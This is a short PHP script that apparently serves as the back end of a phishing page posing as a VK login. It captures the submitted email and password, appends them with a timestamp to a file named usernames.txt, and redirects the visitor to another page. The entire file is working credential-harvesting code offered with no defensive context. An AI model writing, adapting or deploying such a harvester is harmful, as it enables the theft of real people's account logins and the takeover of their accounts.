<?php
$date = date('Y-m-d H:i:s');
file_put_contents("usernames.txt", " $date Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: new.html');
exit();
